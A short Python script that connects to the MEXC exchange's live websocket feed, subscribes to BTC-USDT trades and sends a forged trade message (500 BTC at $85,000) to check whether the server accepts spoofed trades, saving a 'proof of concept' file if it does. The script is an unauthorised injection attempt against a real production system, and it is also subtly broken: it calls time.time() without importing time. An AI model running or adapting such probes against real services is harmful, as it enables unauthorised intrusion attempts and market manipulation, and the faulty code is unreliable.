import asyncio
import websockets
import json
from datetime import datetime

async def test_trades_spoofing():
    """Verify if fake trades can be injected"""
    try:
        print("🔵 [1/5] Connecting to wss://wbs.mexc.com/ws...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # Subscribe to trades
            await ws.send(json.dumps({
                "op": "subscribe",
                "args": ["trades:BTC-USDT"]
            }))
            print("🟢 [2/5] Subscribed to trades channel")
            
            # Wait for subscription confirmation
            response = await ws.recv()
            print(f"🔵 [3/5] Server response: {response}")
            
            # Inject fake trade
            spoofed_trade = {
                "op": "update",
                "args": [{
                    "symbol": "BTC-USDT",
                    "price": "85000.00",  # Abnormal price
                    "quantity": "500",     # Large volume
                    "side": "buy",        # Can test both buy/sell
                    "timestamp": int(time.time() * 1000)
                }]
            }
            await ws.send(json.dumps(spoofed_trade))
            print("🟡 [4/5] Injected fake trade: 500 BTC @ $85K")
            
            # Verify impact
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                if "error" not in response.lower():
                    print("🔴 [5/5] VULNERABILITY CONFIRMED - Trade accepted")
                    with open("mexc_trades_poc.txt", "w") as f:
                        f.write(f"Trade Spoofing Proof - {datetime.now()}\n")
                        f.write(f"Injected: {json.dumps(spoofed_trade)}\n")
                        f.write(f"Response: {response}\n")
                else:
                    print("🟢 [5/5] Server rejected (secure)")
            except asyncio.TimeoutError:
                print("🟠 [5/5] Check MEXC UI - potential blind spoofing")
                
    except Exception as e:
        print(f"🔴 Error: {str(e)}")

asyncio.run(test_trades_spoofing())
